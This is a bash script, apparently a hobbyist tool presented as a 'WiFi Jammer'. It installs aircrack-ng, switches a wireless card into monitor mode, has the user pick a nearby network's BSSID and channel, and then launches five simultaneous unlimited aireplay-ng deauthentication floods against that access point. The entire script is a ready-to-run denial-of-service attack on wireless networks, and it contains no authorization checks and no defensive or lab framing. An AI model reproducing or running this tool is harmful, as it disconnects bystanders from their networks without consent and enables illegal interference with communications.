#!/bin/bash

clear

trap 'printf "\n"; stop' 2
trap 'exit 130' INT

echo -e "\033[1;91m\n[!] WiFi Jammer by Zeeshan Khalid !!! \n\033[1;m"

read -rsn1 -p"[!]Press any key to continue...."; echo

printf "\n"

if [[ $EUID -ne 0 ]]; then
   echo -e "\033[1;91m\n[!] Wifi-Jammer must be run as root. Aborting....¯\_(ツ)_/¯ \n\033[1;m"
   exit 1
fi


requirements() {
    clear
    echo -e "\n[!] Installing Essential Requirements! Please wait...."
    sleep 2

    # Install necessary packages
    apt-get update
    apt-get install -y aircrack-ng pv gnome-terminal

    clear
}


banner() {
    sleep 2

    echo "[!] Requirements Successfully Satisfied!"
    sleep 2

    clear

    echo "WiFi_Jammer by Zeeshan Khalid" 
    echo "Tool to Jam Full WiFi Network Near-You"

    printf "\n"
}

main() {
    sleep 1

    echo -e "[!] Please choose the Network Interface:\n"

    iwconfig

    read -p $'\033[1;91m[!] Enter Your Choice: \033[1;m' network_interface

    echo -e "\n[~] Your Selected NI Card:~[ $network_interface ]\n"

    sleep 2

    printf "\033[1;91m[!] Your Internet or Wifi is going to disconnect.....[Monitor-Mode] \033[1;m\n"
    sleep 3


    airmon-ng start $network_interface
    sleep 2

    clear

    sleep 1

    printf "\033[1;91m\n[~] Read Instructions Carefully !! \033[1;m\n"
    printf "\n"
    sleep 1

    printf "[1] After These Instructions, Wifi or Networks near you are going to Display!\n"
    printf "[2] Please Note Your Target's BSSID and Channel No.(CH) as they are required in the next step!\n"
    printf "[3] After these, You have to Stop the Terminal Window by Pressing Ctrl + C !\n"
    printf "\n"
    read -rsn1 -p"[!] Press Any Key (After reading the Instructions Carefully!):"; echo

    mon="mon"

    gnome-terminal -- airodump-ng $network_interface$mon &

    sleep 2
    printf "\n"
    read -p $'\033[1;91m[!] Please Enter Target BSSID: \033[1;m' BSSID
    printf "\n"
    echo ">> BSSID: $BSSID"
    printf "\n"

    read -p $'\033[1;91m[!] Please Enter Target CH: \033[1;m' CH
    printf "\n"
    echo ">> Channel No: $CH"
    printf "\n"

    echo "[!] OK!"
    sleep 2

    clear

    printf "\n"

    printf "BSSID: $BSSID          CH: $CH\n"

    printf "\n"

    timeout 3 gnome-terminal -- airodump-ng -c $CH --bssid $BSSID $network_interface$mon &

    echo "Your Channel is Selected, Please Wait...!"
    printf "\n"
    sleep 1

    echo "[!] Press Any Key To Start Attack!"

    read -rsn1 -p'_'; echo
    sleep 2

    # Background processes for attack

    for i in 1 2 3 4 5
    do
        gnome-terminal -- aireplay-ng -0 0 -a $BSSID $network_interface$mon &
    done
}


stop() {
    printf "\n"

    echo "[~] Your Attack Has Been Started!!!"
    sleep 2

    printf "\n"

    echo "Thank You For Using Wifi-Jammer"
    printf "\n"

    sleep 1

    echo "[!] Note: You can type 'sudo airmon-ng stop (network_interface name)mon' to send your NI card from Monitor to Managed Mode!"

    printf "\n"

    echo -e "                             [ BY: Zeeshan Khalid | v1.0 ]\n"

    printf "\n"
    printf "\n"
}

requirements
banner
main
stop

#------------------------------------------------------#
# Author                 Zeeshan Khalid               #
#------------------------------------------------------#

